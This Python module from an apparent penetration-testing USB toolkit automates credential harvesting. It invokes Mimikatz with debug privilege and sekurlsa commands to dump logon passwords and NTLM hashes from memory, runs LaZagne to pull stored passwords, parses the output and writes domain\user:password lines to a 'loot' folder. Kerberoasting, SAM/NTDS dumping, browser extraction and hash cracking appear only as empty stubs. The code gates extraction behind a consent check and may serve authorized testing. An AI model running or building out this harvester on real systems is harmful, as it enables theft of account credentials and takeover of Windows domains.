#!/usr/bin/env python3
"""
Credential Access Module - Pentest USB Toolkit

This module implements comprehensive credential harvesting and password attack capabilities
with integration for Mimikatz, LaZagne, Hashcat, and Kerberos attack techniques.

Author: Pentest USB Team
Version: 1.0.0
"""

import os
import sys
import json
import logging
import subprocess
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

# Internal imports
sys.path.append(str(Path(__file__).parent.parent.parent))
from core.utils.logging_handler import setup_logger
from core.utils.error_handler import handle_error
from core.security.consent_manager import ConsentManager
from core.db.sqlite_manager import DatabaseManager


class CredentialType(Enum):
    """Types of credentials that can be extracted."""
    PASSWORD = "password"
    HASH = "hash"
    TOKEN = "token"
    CERTIFICATE = "certificate"
    TICKET = "kerberos_ticket"
    SSH_KEY = "ssh_key"
    API_KEY = "api_key"


class CredentialSource(Enum):
    """Sources where credentials can be found."""
    MEMORY = "memory"
    REGISTRY = "registry"
    FILE_SYSTEM = "file_system"
    BROWSER = "browser"
    NETWORK = "network"
    ACTIVE_DIRECTORY = "active_directory"
    DATABASE = "database"


@dataclass
class Credential:
    """Data structure for storing credential information."""
    username: str
    credential: str
    credential_type: CredentialType
    source: CredentialSource
    domain: Optional[str] = None
    description: Optional[str] = None
    timestamp: Optional[str] = None
    confidence: float = 1.0


class CredentialAccessModule:
    """Main class for credential access operations."""
    
    def __init__(self, target: str, config: Dict[str, Any] = None):
        self.target = target
        self.config = config or {}
        self.logger = setup_logger(__name__)
        self.consent_manager = ConsentManager()
        self.db_manager = DatabaseManager()
        self.credentials: List[Credential] = []
        
        # Tool paths
        self.tool_paths = {
            'mimikatz': self._get_tool_path('mimikatz'),
            'lazagne': self._get_tool_path('lazagne'),
            'hashcat': self._get_tool_path('hashcat'),
            'john': self._get_tool_path('john'),
            'impacket': self._get_tool_path('impacket'),
            'pypykatz': self._get_tool_path('pypykatz')
        }
        
        self.logger.info(f"Initialized CredentialAccessModule for target: {target}")

    def _get_tool_path(self, tool_name: str) -> str:
        """Get the appropriate tool path based on OS."""
        base_path = Path(__file__).parent.parent.parent / "tools" / "binaries"
        
        if sys.platform.startswith('win'):
            return str(base_path / "windows" / f"{tool_name}.exe")
        elif sys.platform.startswith('linux'):
            return str(base_path / "linux" / tool_name)
        else:  # macOS
            return str(base_path / "macos" / tool_name)

    @handle_error
    def extract_credentials(self, methods: List[str] = None, profile: str = "default") -> Dict[str, Any]:
        """
        Main method to extract credentials using specified methods.
        
        Args:
            methods: List of extraction methods to use
            profile: Scan profile (quick, default, comprehensive)
            
        Returns:
            Dictionary containing extraction results
        """
        self.logger.info("Starting credential extraction")
        
        # Verify consent and authorization
        if not self.consent_manager.verify_authorization(self.target, "credential_access"):
            raise PermissionError("No authorization for credential access on target")
        
        if methods is None:
            methods = self._get_default_methods(profile)
        
        results = {
            'target': self.target,
            'methods_used': methods,
            'credentials_found': [],
            'hashes_found': [],
            'tokens_found': [],
            'success_rate': 0.0,
            'execution_time': 0
        }
        
        start_time = time.time()
        
        try:
            for method in methods:
                self.logger.info(f"Executing credential extraction method: {method}")
                
                if method == "mimikatz_memory":
                    mimikatz_results = self._run_mimikatz_memory_dump()
                    results['credentials_found'].extend(mimikatz_results)
                
                elif method == "lazagne_all":
                    lazagne_results = self._run_lazagne_extraction()
                    results['credentials_found'].extend(lazagne_results)
                
                elif method == "browser_extraction":
                    browser_results = self._extract_browser_credentials()
                    results['credentials_found'].extend(browser_results)
                
                elif method == "registry_extraction":
                    registry_results = self._extract_registry_credentials()
                    results['credentials_found'].extend(registry_results)
                
                elif method == "kerberos_attacks":
                    kerberos_results = self._perform_kerberos_attacks()
                    results['credentials_found'].extend(kerberos_results)
                
                elif method == "hash_extraction":
                    hash_results = self._extract_password_hashes()
                    results['hashes_found'].extend(hash_results)
                
                elif method == "token_extraction":
                    token_results = self._extract_access_tokens()
                    results['tokens_found'].extend(token_results)
        
        except Exception as e:
            self.logger.error(f"Error during credential extraction: {e}")
            results['error'] = str(e)
        
        finally:
            results['execution_time'] = time.time() - start_time
            results['success_rate'] = self._calculate_success_rate(results)
            
        self.logger.info(f"Credential extraction completed in {results['execution_time']:.2f} seconds")
        return results

    def _get_default_methods(self, profile: str) -> List[str]:
        """Get default extraction methods based on profile."""
        methods = {
            'quick': ['lazagne_all', 'browser_extraction'],
            'default': ['mimikatz_memory', 'lazagne_all', 'browser_extraction', 'registry_extraction'],
            'comprehensive': [
                'mimikatz_memory', 'lazagne_all', 'browser_extraction', 
                'registry_extraction', 'kerberos_attacks', 'hash_extraction', 'token_extraction'
            ]
        }
        return methods.get(profile, methods['default'])

    def _run_mimikatz_memory_dump(self) -> List[Dict[str, Any]]:
        """Run Mimikatz to extract credentials from memory."""
        self.logger.info("Running Mimikatz memory dump")
        
        if not Path(self.tool_paths['mimikatz']).exists():
            self.logger.warning("Mimikatz not found, skipping memory dump")
            return []
        
        try:
            # Mimikatz commands
            commands = [
                "privilege::debug",
                "sekurlsa::logonpasswords",
                "sekurlsa::wdigest",
                "sekurlsa::kerberos",
                "sekurlsa::tspkg",
                "sekurlsa::credman"
            ]
            
            mimikatz_cmd = f'"{self.tool_paths["mimikatz"]}" "' + '" "'.join(commands) + '"'
            
            result = subprocess.run(
                mimikatz_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                return self._parse_mimikatz_output(result.stdout)
            else:
                self.logger.error(f"Mimikatz failed: {result.stderr}")
                return []
                
        except subprocess.TimeoutExpired:
            self.logger.error("Mimikatz execution timed out")
            return []
        except Exception as e:
            self.logger.error(f"Error running Mimikatz: {e}")
            return []

    def _parse_mimikatz_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse Mimikatz output to extract credentials."""
        credentials = []
        lines = output.split('\n')
        
        current_session = {}
        for line in lines:
            line = line.strip()
            
            if "Username" in line:
                current_session['username'] = line.split(':')[1].strip()
            elif "Domain" in line:
                current_session['domain'] = line.split(':')[1].strip()
            elif "Password" in line and ":" in line:
                password = line.split(':', 1)[1].strip()
                if password and password != "(null)":
                    credential = {
                        'username': current_session.get('username', 'unknown'),
                        'credential': password,
                        'credential_type': 'password',
                        'domain': current_session.get('domain', ''),
                        'source': 'memory',
                        'tool': 'mimikatz'
                    }
                    credentials.append(credential)
            elif "NTLM" in line and ":" in line:
                ntlm_hash = line.split(':', 1)[1].strip()
                if ntlm_hash and ntlm_hash != "(null)":
                    credential = {
                        'username': current_session.get('username', 'unknown'),
                        'credential': ntlm_hash,
                        'credential_type': 'ntlm_hash',
                        'domain': current_session.get('domain', ''),
                        'source': 'memory',
                        'tool': 'mimikatz'
                    }
                    credentials.append(credential)
        
        return credentials

    def _run_lazagne_extraction(self) -> List[Dict[str, Any]]:
        """Run LaZagne to extract stored passwords."""
        self.logger.info("Running LaZagne password extraction")
        
        if not Path(self.tool_paths['lazagne']).exists():
            self.logger.warning("LaZagne not found, skipping extraction")
            return []
        
        try:
            lazagne_cmd = [self.tool_paths['lazagne'], 'all', '-oJ']
            
            result = subprocess.run(
                lazagne_cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                return self._parse_lazagne_output(result.stdout)
            else:
                self.logger.error(f"LaZagne failed: {result.stderr}")
                return []
                
        except subprocess.TimeoutExpired:
            self.logger.error("LaZagne execution timed out")
            return []
        except Exception as e:
            self.logger.error(f"Error running LaZagne: {e}")
            return []

    def _parse_lazagne_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse LaZagne JSON output."""
        try:
            data = json.loads(output)
            credentials = []
            
            for category in data:
                if isinstance(data[category], list):
                    for item in data[category]:
                        credential = {
                            'username': item.get('Login', 'unknown'),
                            'credential': item.get('Password', ''),
                            'credential_type': 'password',
                            'source': category.lower(),
                            'url': item.get('URL', ''),
                            'tool': 'lazagne'
                        }
                        credentials.append(credential)
            
            return credentials
            
        except json.JSONDecodeError:
            self.logger.error("Failed to parse LaZagne JSON output")
            return []

    def _extract_browser_credentials(self) -> List[Dict[str, Any]]:
        """Extract credentials from browser storage."""
        self.logger.info("Extracting browser credentials")
        
        credentials = []
        browsers = ['chrome', 'firefox', 'edge', 'safari']
        
        for browser in browsers:
            browser_creds = self._extract_specific_browser(browser)
            credentials.extend(browser_creds)
        
        return credentials

    def _extract_specific_browser(self, browser: str) -> List[Dict[str, Any]]:
        """Extract credentials from a specific browser."""
        # This is a simplified implementation
        # In a real scenario, you'd access browser databases and decrypt stored passwords
        self.logger.info(f"Extracting {browser} credentials")
        
        # Placeholder for browser-specific credential extraction
        # Real implementation would involve:
        # 1. Locating browser profile directories
        # 2. Accessing encrypted password databases
        # 3. Decrypting stored passwords using OS keychain/DPAPI
        
        return []

    def _extract_registry_credentials(self) -> List[Dict[str, Any]]:
        """Extract credentials from Windows registry."""
        self.logger.info("Extracting registry credentials")
        
        if sys.platform != 'win32':
            return []
        
        try:
            import winreg
            
            credentials = []
            # Common registry locations for stored credentials
            registry_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers",
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                r"SYSTEM\CurrentControlSet\Services"
            ]
            
            for path in registry_paths:
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path) as key:
                        # Extract relevant credential data
                        pass
                except FileNotFoundError:
                    continue
            
            return credentials
            
        except ImportError:
            self.logger.warning("Windows registry access not available")
            return []

    def _perform_kerberos_attacks(self) -> List[Dict[str, Any]]:
        """Perform Kerberos-based attacks (ASREPRoast, Kerberoasting)."""
        self.logger.info("Performing Kerberos attacks")
        
        credentials = []
        
        try:
            # ASREPRoast attack
            asrep_results = self._asreproast_attack()
            credentials.extend(asrep_results)
            
            # Kerberoasting attack
            kerberoast_results = self._kerberoasting_attack()
            credentials.extend(kerberoast_results)
            
        except Exception as e:
            self.logger.error(f"Error during Kerberos attacks: {e}")
        
        return credentials

    def _asreproast_attack(self) -> List[Dict[str, Any]]:
        """Perform ASREPRoast attack."""
        # Implementation for ASREPRoast using Impacket
        return []

    def _kerberoasting_attack(self) -> List[Dict[str, Any]]:
        """Perform Kerberoasting attack."""
        # Implementation for Kerberoasting using Impacket
        return []

    def _extract_password_hashes(self) -> List[Dict[str, Any]]:
        """Extract password hashes from various sources."""
        self.logger.info("Extracting password hashes")
        
        hashes = []
        
        try:
            # SAM database hashes
            sam_hashes = self._extract_sam_hashes()
            hashes.extend(sam_hashes)
            
            # NTDS.dit hashes (Domain Controller)
            ntds_hashes = self._extract_ntds_hashes()
            hashes.extend(ntds_hashes)
            
        except Exception as e:
            self.logger.error(f"Error extracting hashes: {e}")
        
        return hashes

    def _extract_sam_hashes(self) -> List[Dict[str, Any]]:
        """Extract hashes from SAM database."""
        # Implementation for SAM hash extraction
        return []

    def _extract_ntds_hashes(self) -> List[Dict[str, Any]]:
        """Extract hashes from NTDS.dit."""
        # Implementation for NTDS hash extraction
        return []

    def _extract_access_tokens(self) -> List[Dict[str, Any]]:
        """Extract access tokens from memory."""
        self.logger.info("Extracting access tokens")
        
        tokens = []
        
        try:
            # Windows access tokens
            if sys.platform == 'win32':
                tokens.extend(self._extract_windows_tokens())
            
            # JWT tokens from memory/files
            jwt_tokens = self._extract_jwt_tokens()
            tokens.extend(jwt_tokens)
            
        except Exception as e:
            self.logger.error(f"Error extracting tokens: {e}")
        
        return tokens

    def _extract_windows_tokens(self) -> List[Dict[str, Any]]:
        """Extract Windows access tokens."""
        return []

    def _extract_jwt_tokens(self) -> List[Dict[str, Any]]:
        """Extract JWT tokens from various sources."""
        return []

    def crack_hashes(self, hashes: List[str], wordlist: str = None, rules: str = None) -> Dict[str, Any]:
        """
        Crack password hashes using Hashcat/John.
        
        Args:
            hashes: List of password hashes to crack
            wordlist: Path to wordlist file
            rules: Path to rules file
            
        Returns:
            Dictionary containing cracking results
        """
        self.logger.info("Starting hash cracking")
        
        if not hashes:
            return {'cracked': [], 'total_hashes': 0}
        
        results = {
            'cracked': [],
            'total_hashes': len(hashes),
            'success_rate': 0.0
        }
        
        try:
            # Use Hashcat if available, fallback to John
            if Path(self.tool_paths['hashcat']).exists():
                cracked = self._crack_with_hashcat(hashes, wordlist, rules)
            elif Path(self.tool_paths['john']).exists():
                cracked = self._crack_with_john(hashes, wordlist, rules)
            else:
                self.logger.warning("No hash cracking tools available")
                return results
            
            results['cracked'] = cracked
            results['success_rate'] = len(cracked) / len(hashes) if hashes else 0.0
            
        except Exception as e:
            self.logger.error(f"Error during hash cracking: {e}")
            results['error'] = str(e)
        
        return results

    def _crack_with_hashcat(self, hashes: List[str], wordlist: str, rules: str) -> List[Dict[str, Any]]:
        """Crack hashes using Hashcat."""
        # Implementation for Hashcat hash cracking
        return []

    def _crack_with_john(self, hashes: List[str], wordlist: str, rules: str) -> List[Dict[str, Any]]:
        """Crack hashes using John the Ripper."""
        # Implementation for John the Ripper hash cracking
        return []

    def _calculate_success_rate(self, results: Dict[str, Any]) -> float:
        """Calculate the overall success rate of credential extraction."""
        total_attempts = len(results.get('methods_used', []))
        successful_methods = 0
        
        if results.get('credentials_found'):
            successful_methods += 1
        if results.get('hashes_found'):
            successful_methods += 1
        if results.get('tokens_found'):
            successful_methods += 1
        
        return successful_methods / total_attempts if total_attempts > 0 else 0.0

    def save_credentials(self, output_dir: str = None) -> str:
        """Save extracted credentials to files."""
        if not output_dir:
            output_dir = Path(__file__).parent.parent.parent / "data" / "loot" / "credentials"
        
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # Save as JSON
        json_file = output_dir / f"credentials_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump([cred.__dict__ for cred in self.credentials], f, indent=2)
        
        # Save as text
        txt_file = output_dir / f"credentials_{timestamp}.txt"
        with open(txt_file, 'w') as f:
            for cred in self.credentials:
                f.write(f"{cred.domain}\\{cred.username}:{cred.credential}\n")
        
        self.logger.info(f"Credentials saved to {json_file} and {txt_file}")
        return str(json_file)


def main():
    """Main function for testing the module."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Credential Access Module")
    parser.add_argument("--target", required=True, help="Target system IP/hostname")
    parser.add_argument("--profile", choices=['quick', 'default', 'comprehensive'], 
                       default='default', help="Scan profile")
    parser.add_argument("--methods", nargs='+', help="Specific methods to use")
    parser.add_argument("--output", help="Output directory for results")
    
    args = parser.parse_args()
    
    # Initialize module
    cred_module = CredentialAccessModule(args.target)
    
    # Extract credentials
    results = cred_module.extract_credentials(
        methods=args.methods,
        profile=args.profile
    )
    
    # Save results
    if args.output:
        cred_module.save_credentials(args.output)
    
    # Print summary
    print(f"\n=== Credential Access Results ===")
    print(f"Target: {results['target']}")
    print(f"Methods used: {', '.join(results['methods_used'])}")
    print(f"Credentials found: {len(results['credentials_found'])}")
    print(f"Hashes found: {len(results['hashes_found'])}")
    print(f"Tokens found: {len(results['tokens_found'])}")
    print(f"Success rate: {results['success_rate']:.2%}")
    print(f"Execution time: {results['execution_time']:.2f} seconds")


if __name__ == "__main__":
    main()